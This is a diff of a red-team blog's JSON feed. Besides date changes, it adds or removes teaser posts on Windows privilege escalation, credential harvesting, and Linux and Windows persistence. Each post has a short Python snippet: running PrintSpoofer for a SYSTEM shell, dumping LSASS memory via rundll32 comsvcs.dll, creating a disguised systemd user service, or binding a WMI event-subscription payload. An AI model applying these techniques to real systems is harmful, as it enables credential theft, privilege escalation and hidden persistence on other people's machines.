@@ -20,8 +20,8 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T19:03:08-05:00",
-            "date_modified": "2026-01-23T19:03:08-05:00"
+            "date_published": "2026-01-22T13:03:00-05:00",
+            "date_modified": "2026-01-23T19:13:41-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-17.html",
@@ -34,8 +34,23 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T19:00:24-05:00",
-            "date_modified": "2026-01-23T19:00:24-05:00"
+            "date_published": "2026-01-19T19:00:00-05:00",
+            "date_modified": "2026-01-23T19:13:17-05:00"
+        },
+        {
+            "id": "https://maxwell-cross.com/30-days-red-team-day-16.html",
+            "url": "https://maxwell-cross.com/30-days-red-team-day-16.html",
+            "title": "30 Days of Red Team: Day 16 — Privilege Escalation",
+            "summary": "You have a shell. But you are still in a cage. You’ve compromised the target. The C2 is stable. But when you run whoami, you see corp\\jdoe. You have no admin rights. No hash dumping. No lateral movement. This is where amateur hackers give up&hellip;",
+            "content_html": "<h4 data-path-to-node=\"10\"><strong data-path-to-node=\"10\" data-index-in-node=\"0\">You have a shell. But you are still in a cage.</strong></h4>\n<p data-path-to-node=\"11\">You’ve compromised the target. The C2 is stable. But when you run <code data-path-to-node=\"11\" data-index-in-node=\"66\">whoami</code>, you see <code data-path-to-node=\"11\" data-index-in-node=\"82\">corp\\jdoe</code>. You have no admin rights. No hash dumping. No lateral movement.</p>\n<p data-path-to-node=\"12\">This is where amateur hackers give up and start throwing noisy kernel exploits at the wall, hoping something sticks.</p>\n<p data-path-to-node=\"13\">Professionals know that Windows is full of misconfigurations. Today, we stop guessing and start hunting. We are going to find the weak service permissions, the unquoted paths, and the token privileges that allow us to become <strong data-path-to-node=\"13\" data-index-in-node=\"225\">SYSTEM</strong>.</p>\n<hr>\n<h3 data-path-to-node=\"15\"><strong data-path-to-node=\"15\" data-index-in-node=\"0\">A Glimpse of the Code: The \"Potato\" Attack</strong></h3>\n<p data-path-to-node=\"16\">Sometimes, you don't need a vulnerability. You just need a privilege.</p>\n<p data-path-to-node=\"17\">If your compromised user has <code data-path-to-node=\"17\" data-index-in-node=\"29\">SeImpersonatePrivilege</code> (common for service accounts), you can trick the SYSTEM account into authenticating to you, steal its token, and become God.</p>\n<p data-path-to-node=\"18\">Here is the logic for our <strong data-path-to-node=\"18\" data-index-in-node=\"26\">Token Impersonator</strong> tool:</p>\n<pre class=\"language-python\"><code>def use_printspoofer(self):\n    \"\"\"\n    Abuse the Print Spooler service to get a SYSTEM token.\n    1. Force the Spooler service to connect to our named pipe.\n    2. Impersonate the client (SYSTEM).\n    3. Duplicate the token and spawn a new shell.\n    \"\"\"\n    # Upload PrintSpoofer binary to temp\n    self.upload_file(\"PrintSpoofer.exe\", \"C:\\\\Windows\\\\Temp\\\\ps.exe\")\n    \n    # Execute to get an interactive SYSTEM shell\n    cmd = \"C:\\\\Windows\\\\Temp\\\\ps.exe -i -c cmd.exe\"\n    \n    result = self.execute_command(cmd)\n    \n    if result.success:\n        print(\"[+] Token stolen successfully!\")\n        print(\"[+] Current User: NT AUTHORITY\\\\SYSTEM\")\n        return True</code></pre>\n<p>This technique works on almost every modern Windows version and requires zero exploits, just a clever abuse of built-in features.</p>\n<hr>\n<h4 data-path-to-node=\"22\"><strong data-path-to-node=\"22\" data-index-in-node=\"0\">Read the full guide on Medium to get:</strong></h4>\n<ul data-path-to-node=\"23\">\n<li>\n<p data-path-to-node=\"23,0,0\"><strong data-path-to-node=\"23,0,0\" data-index-in-node=\"0\">The Automated Enumerator:</strong> A script that scans the system for 7 different escalation vectors in under 30 seconds.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,1,0\"><strong data-path-to-node=\"23,1,0\" data-index-in-node=\"0\">Service Exploitation:</strong> How to hijack \"Unquoted Service Paths\" and replace legitimate binaries with your own payload.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,2,0\"><strong data-path-to-node=\"23,2,0\" data-index-in-node=\"0\">Registry Abuse:</strong> Checking for the <code data-path-to-node=\"23,2,0\" data-index-in-node=\"33\">AlwaysInstallElevated</code> key, which lets any MSI installer run as SYSTEM.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,3,0\"><strong data-path-to-node=\"23,3,0\" data-index-in-node=\"0\">UAC Bypass:</strong> How to use <code data-path-to-node=\"23,3,0\" data-index-in-node=\"24\">fodhelper.exe</code> to bypass the User Account Control prompt silently.</p>\n</li>\n</ul>\n<p data-path-to-node=\"24\">We are done asking for permission. Today, we take it.</p>\n<p data-path-to-node=\"24\"><strong><a href=\"https://medium.com/30-days-of-red-team/30-days-of-red-team-day-16-windows-privilege-escalation-9a2ed6f64791\" target=\"_blank\" rel=\"noopener noreferrer\">READ THE FULL GUIDE ON MEDIUM ➔</a></strong></p>",
+            "image": "https://maxwell-cross.com/media/posts/3/Adobe-Express-file.png",
+            "author": {
+                "name": "Maxwell Cross"
+            },
+            "tags": [
+            ],
+            "date_published": "2026-01-14T13:03:00-05:00",
+            "date_modified": "2026-01-23T19:12:27-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-155.html",
@@ -48,8 +63,23 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T18:53:44-05:00",
-            "date_modified": "2026-01-23T18:53:44-05:00"
+            "date_published": "2026-01-12T18:53:00-05:00",
+            "date_modified": "2026-01-23T19:12:55-05:00"
+        },
+        {
+            "id": "https://maxwell-cross.com/30-days-red-team-day-15.html",
+            "url": "https://maxwell-cross.com/30-days-red-team-day-15.html",
+            "title": "30 Days of Red Team: Day 15 — Credential Harvesting",
+            "summary": "You don't need an exploit if you have their password. You have the shell. You have the persistence. But you are still just one user on one machine. Amateurs waste hours looking for kernel exploits to escalate privileges. Professionals know that Windows leaves credentials lying&hellip;",
+            "content_html": "<h4 data-path-to-node=\"10\"><strong data-path-to-node=\"10\" data-index-in-node=\"0\">You don't need an exploit if you have their password.</strong></h4>\n<p data-path-to-node=\"11\">You have the shell. You have the persistence. But you are still just one user on one machine.</p>\n<p data-path-to-node=\"12\">Amateurs waste hours looking for kernel exploits to escalate privileges. Professionals know that Windows leaves credentials lying around everywhere: in memory, in the Registry, and in the file system.</p>\n<p data-path-to-node=\"13\">Today, we stop trying to \"hack\" the system and start harvesting what the users have already given us. We are turning a single compromised workstation into a keychain that unlocks the entire domain.</p>\n<hr>\n<h3 data-path-to-node=\"15\"><strong data-path-to-node=\"15\" data-index-in-node=\"0\">A Glimpse of the Code: Dumping LSASS Without Mimikatz</strong></h3>\n<p data-path-to-node=\"16\">Running <code data-path-to-node=\"16\" data-index-in-node=\"8\">mimikatz.exe</code> is the fastest way to get banned from a network. Every antivirus knows its signature.</p>\n<p data-path-to-node=\"17\">In Day 15, we use <strong data-path-to-node=\"17\" data-index-in-node=\"18\">comsvcs.dll</strong>—a legitimate Windows library—to dump the LSASS process memory. Because the tool is signed by Microsoft, it often slips past basic defenses.</p>\n<p data-path-to-node=\"18\">Here is the core logic from our <strong data-path-to-node=\"18\" data-index-in-node=\"32\">LsassDumper</strong> tool:</p>\n<pre class=\"language-python\"><code>def dump_via_comsvcs(self):\n    \"\"\"\n    Stealthy LSASS Dump.\n    Uses the native Windows 'comsvcs.dll' to create a minidump \n    of the LSASS process. No external malware required.\n    \"\"\"\n    lsass_pid = self.get_lsass_pid()\n    dump_path = f\"C:\\\\Windows\\\\Temp\\\\.{random_name()}.tmp\"\n    \n    # Use rundll32 to call MiniDumpW \n    # This looks like a system admin performing maintenance\n    cmd = f\"rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll,MiniDump {lsass_pid} {dump_path} full\"\n    \n    result = self.execute_command(cmd)\n    \n    if result.success:\n        print(f\"[+] LSASS dumped via comsvcs: {dump_path}\")\n        return dump_path</code></pre>\n<p>Once we have the dump file, we exfiltrate it and extract the passwords offline, keeping our footprint on the target machine minimal.</p>\n<hr>\n<h4 data-path-to-node=\"22\"><strong data-path-to-node=\"22\" data-index-in-node=\"0\">Read the full guide on Medium to get:</strong></h4>\n<ul data-path-to-node=\"23\">\n<li>\n<p data-path-to-node=\"23,0,0\"><strong data-path-to-node=\"23,0,0\" data-index-in-node=\"0\">The SAM &amp; SYSTEM Extractor:</strong> How to pull local account hashes (NTLM) directly from the registry hives to crack offline.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,1,0\"><strong data-path-to-node=\"23,1,0\" data-index-in-node=\"0\">DPAPI Decryption:</strong> A tool to decrypt saved <strong data-path-to-node=\"23,1,0\" data-index-in-node=\"42\">Chrome/Edge passwords</strong> and Windows Vault credentials using the user's master key.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,2,0\"><strong data-path-to-node=\"23,2,0\" data-index-in-node=\"0\">Registry Mining:</strong> How to find plaintext service account passwords hidden in LSA Secrets and AutoLogon configurations.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,3,0\"><strong data-path-to-node=\"23,3,0\" data-index-in-node=\"0\">Credential Consolidation:</strong> A script that maps out password reuse across the network to identify the \"Skeleton Key\" account.</p>\n</li>\n</ul>\n<p data-path-to-node=\"24\">We have the keys. Tomorrow, we take the throne.</p>\n<p data-path-to-node=\"24\"><strong data-path-to-node=\"25\" data-index-in-node=\"2\"><a href=\"https://medium.com/30-days-of-red-team/30-days-of-red-team-day-15-credential-harvesting-829737ccc5e6\" target=\"_blank\" rel=\"noopener noreferrer\">READ THE FULL GUIDE ON MEDIUM ➔</a></strong></p>",
+            "image": "https://maxwell-cross.com/media/posts/4/Adobe-Express-file1.png",
+            "author": {
+                "name": "Maxwell Cross"
+            },
+            "tags": [
+            ],
+            "date_published": "2026-01-11T17:38:00-05:00",
+            "date_modified": "2026-01-23T19:12:08-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-14.html",
@@ -62,8 +92,8 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T18:40:24-05:00",
-            "date_modified": "2026-01-23T18:40:24-05:00"
+            "date_published": "2026-01-10T12:40:00-05:00",
+            "date_modified": "2026-01-23T19:11:50-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-13.html",
@@ -76,8 +106,8 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T18:35:43-05:00",
-            "date_modified": "2026-01-23T18:35:43-05:00"
+            "date_published": "2025-12-21T15:35:00-05:00",
+            "date_modified": "2026-01-23T19:11:15-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-12.html",
@@ -90,8 +120,8 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T18:33:01-05:00",
-            "date_modified": "2026-01-23T18:33:01-05:00"
+            "date_published": "2025-12-16T19:33:00-05:00",
+            "date_modified": "2026-01-23T19:08:54-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-11.html",
@@ -104,8 +134,8 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T18:29:54-05:00",
-            "date_modified": "2026-01-23T18:29:54-05:00"
+            "date_published": "2025-12-03T18:29:00-05:00",
+            "date_modified": "2026-01-23T19:08:21-05:00"
         },
         {
             "id": "https://maxwell-cross.com/30-days-red-team-day-10.html",
@@ -118,36 +148,8 @@
             },
             "tags": [
             ],
-            "date_published": "2026-01-23T18:27:06-05:00",
-            "date_modified": "2026-01-23T18:27:06-05:00"
-        },
-        {
-            "id": "https://maxwell-cross.com/30-days-red-team-day-9.html",
-            "url": "https://maxwell-cross.com/30-days-red-team-day-9.html",
-            "title": "30 Days of Red Team: Day 9 — Linux Persistence",
-            "summary": "Windows has the Registry. Linux has Everything Else. Yesterday, we hid inside the Windows Registry. Today, we enter the world of Linux, where \"everything is a file\"—including your malware. If you think Linux persistence is just adding a Cron job and calling it a day,&hellip;",
-            "content_html": "<h4 data-path-to-node=\"10\"><strong data-path-to-node=\"10\" data-index-in-node=\"0\">Windows has the Registry. Linux has Everything Else.</strong></h4>\n<p data-path-to-node=\"11\">Yesterday, we hid inside the Windows Registry. Today, we enter the world of Linux, where \"everything is a file\"—including your malware.</p>\n<p data-path-to-node=\"12\">If you think Linux persistence is just adding a Cron job and calling it a day, you are going to get caught. Modern Linux environments (especially in the cloud) are heavily monitored. To survive reboots and <code data-path-to-node=\"12\" data-index-in-node=\"206\">rm -rf</code> commands, you need to understand the boot process better than the sysadmin does.</p>\n<p data-path-to-node=\"13\">Today, we cover the art of staying root.</p>\n<hr>\n<h3 data-path-to-node=\"15\"><strong data-path-to-node=\"15\" data-index-in-node=\"0\">A Glimpse of the Code: Systemd Persistence</strong></h3>\n<p data-path-to-node=\"16\">Cron is noisy. <strong data-path-to-node=\"16\" data-index-in-node=\"15\">Systemd</strong> is professional.</p>\n<p data-path-to-node=\"17\">Systemd manages services on almost every modern Linux distro. By creating a custom user service, we can ensure our payload restarts automatically if it crashes or is killed. Here is the logic from the <strong data-path-to-node=\"17\" data-index-in-node=\"201\">Systemd Persistence Tool</strong> we build in the full article:</p>\n<pre class=\"language-python\"><code>def create_user_service(service_name, payload_command):\n    \"\"\"\n    Create a systemd user service that survives reboots (no root required).\n    \"\"\"\n    service_content = f\"\"\"[Unit]\nDescription=User background synchronization service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/bin/bash -c '{payload_command}'\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=default.target\n\"\"\"\n    # Write to ~/.config/systemd/user/ and enable lingering\n    # \"Lingering\" ensures the service runs even when the user is logged out.\n    subprocess.run(f'loginctl enable-linger {os.getenv(\"USER\")}', shell=True)</code></pre>\n<p>This technique allows your persistence to survive even when the user logs out, effectively turning a low-privilege user account into a permanent foothold.</p>\n<hr>\n<h4 data-path-to-node=\"21\"><strong data-path-to-node=\"21\" data-index-in-node=\"0\">Read the full guide on Medium to get:</strong></h4>\n<ul data-path-to-node=\"22\">\n<li>\n<p data-path-to-node=\"22,0,0\"><strong data-path-to-node=\"22,0,0\" data-index-in-node=\"0\">The Cron Framework:</strong> How to install stealthy Cron jobs that blend in with system tasks (and how to hide them from casual inspection).</p>\n</li>\n<li>\n<p data-path-to-node=\"22,1,0\"><strong data-path-to-node=\"22,1,0\" data-index-in-node=\"0\">SSH Key Injection:</strong> A script to generate backdoor SSH keys and inject them into <code data-path-to-node=\"22,1,0\" data-index-in-node=\"80\">authorized_keys</code> without leaving a command history trail.</p>\n</li>\n<li>\n<p data-path-to-node=\"22,2,0\"><strong data-path-to-node=\"22,2,0\" data-index-in-node=\"0\">Shell Profile Poisoning:</strong> How to modify <code data-path-to-node=\"22,2,0\" data-index-in-node=\"39\">.bashrc</code> and <code data-path-to-node=\"22,2,0\" data-index-in-node=\"51\">.profile</code> so your payload executes every time an admin logs in to check the server.</p>\n</li>\n<li>\n<p data-path-to-node=\"22,3,0\"><strong data-path-to-node=\"22,3,0\" data-index-in-node=\"0\">The Master Linux Framework:</strong> A Python tool that detects your privileges (Root vs. User) and automatically installs the best available persistence method.</p>\n</li>\n</ul>\n<p data-path-to-node=\"23\">We own the server. Now, let's make sure we keep it.</p>\n<p data-path-to-node=\"23\"><a href=\"https://medium.com/30-days-of-red-team/30-days-of-red-team-day-9-linux-persistence-techniques-surviving-in-unix-territory-d654252c61c5\" target=\"_blank\" rel=\"noopener noreferrer\">READ THE FULL GUIDE ON MEDIUM ➔</a></p>",
-            "author": {
-                "name": "Maxwell Cross"
-            },
-            "tags": [
-            ],
-            "date_published": "2026-01-23T18:23:50-05:00",
-            "date_modified": "2026-01-23T18:23:50-05:00"
-        },
-        {
-            "id": "https://maxwell-cross.com/30-days-red-team-day-8.html",
-            "url": "https://maxwell-cross.com/30-days-red-team-day-8.html",
-            "title": "30 Days of Red Team: Day 8 — Windows Persistence",
-            "summary": "Getting in is hard. Getting locked out is easy. You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius. Then the user reboots their computer. Your connection dies. Your shell is&hellip;",
-            "content_html": "<h4 data-path-to-node=\"10\"><strong data-path-to-node=\"10\" data-index-in-node=\"0\">Getting in is hard. Getting locked out is easy.</strong></h4>\n<p data-path-to-node=\"11\">You spent Week 1 learning how to hack. You reconned the target, weaponized a payload, and popped a shell. You feel like a genius.</p>\n<p data-path-to-node=\"12\">Then the user reboots their computer.</p>\n<p data-path-to-node=\"13\">Your connection dies. Your shell is gone. And because you didn't establish <strong data-path-to-node=\"13\" data-index-in-node=\"75\">Persistence</strong>, you have to start over from scratch.</p>\n<p data-path-to-node=\"14\">Today, we begin Week 2 by ensuring that never happens. We are building the tools to survive reboots, logoffs, and even active hunting by the Blue Team.</p>\n<hr>\n<h4 data-path-to-node=\"16\"><strong data-path-to-node=\"16\" data-index-in-node=\"0\">A Glimpse of the Code: WMI Event Subscriptions</strong></h4>\n<p data-path-to-node=\"17\">Amateurs put a batch file in the Startup folder. Professionals use <strong data-path-to-node=\"17\" data-index-in-node=\"67\">WMI</strong>.</p>\n<p data-path-to-node=\"18\">Windows Management Instrumentation (WMI) allows us to create \"fileless\" persistence that never touches the disk and doesn't show up in the Registry. Here is the core logic for binding a malicious payload to a system event:</p>\n<pre class=\"language-python\"><code>def create_wmi_persistence(self, payload_command, event_name):\n    \"\"\"\n    Creates WMI event subscription for stealthy persistence.\n    1. Filter: Defines WHEN to trigger (e.g., system uptime &gt; 2 min)\n    2. Consumer: Defines WHAT to run (our payload)\n    3. Binding: Connects them together\n    \"\"\"\n    ps_script = f'''\n    # 1. Event Filter\n    $FilterArgs = @{{\n        name='_{event_name}_Filter';\n        EventNameSpace='root\\\\CimV2';\n        Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 \n               WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n    }};\n    \n    # 2. Event Consumer\n    $ConsumerArgs = @{{\n        name='_{event_name}_Consumer';\n        CommandLineTemplate=\"{payload_command}\"\n    }};\n    \n    # 3. Binding\n    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding ...\n    '''\n    return ps_script</code></pre>\n<p>This script buries your access deep within the Windows operating system, making it incredibly difficult to detect without specialized forensic tools.</p>\n<hr>\n<h4 data-path-to-node=\"22\"><strong data-path-to-node=\"22\" data-index-in-node=\"0\">Read the full guide on Medium to get:</strong></h4>\n<ul data-path-to-node=\"23\">\n<li>\n<p data-path-to-node=\"23,0,0\"><strong data-path-to-node=\"23,0,0\" data-index-in-node=\"0\">The Registry Framework:</strong> 8 different methods to hook into the Windows Registry, including \"Image File Execution Options\" (IFEO) hijacking.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,1,0\"><strong data-path-to-node=\"23,1,0\" data-index-in-node=\"0\">Smart Scheduled Tasks:</strong> How to create tasks that trigger not just on time, but on specific events like <strong data-path-to-node=\"23,1,0\" data-index-in-node=\"102\">User Logon</strong> or <strong data-path-to-node=\"23,1,0\" data-index-in-node=\"116\">System Idle</strong>.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,2,0\"><strong data-path-to-node=\"23,2,0\" data-index-in-node=\"0\">Service Wrapper:</strong> A tool to run your malware as a legitimate background service with SYSTEM privileges.</p>\n</li>\n<li>\n<p data-path-to-node=\"23,3,0\"><strong data-path-to-node=\"23,3,0\" data-index-in-node=\"0\">The Master Persistence Script:</strong> A \"Nuclear Option\" script that installs 7 layers of persistence simultaneously to guarantee you never lose access.</p>\n</li>\n</ul>\n<p data-path-to-node=\"24\">The Golden Rule of Persistence: Always establish two doors. Today, we build them.</p>\n<p data-path-to-node=\"24\"><a href=\"https://medium.com/30-days-of-red-team/30-days-of-red-team-day-8-windows-persistence-mechanisms-bee31a6ba75d\" target=\"_blank\" rel=\"noopener noreferrer\">READ THE FULL GUIDE ON MEDIUM ➔</a></p>",
-            "author": {
-                "name": "Maxwell Cross"
-            },
-            "tags": [
-            ],
-            "date_published": "2026-01-23T18:20:49-05:00",
-            "date_modified": "2026-01-23T18:20:49-05:00"
+            "date_published": "2025-11-27T21:27:00-05:00",
+            "date_modified": "2026-01-23T19:08:00-05:00"
         }
     ]
 }
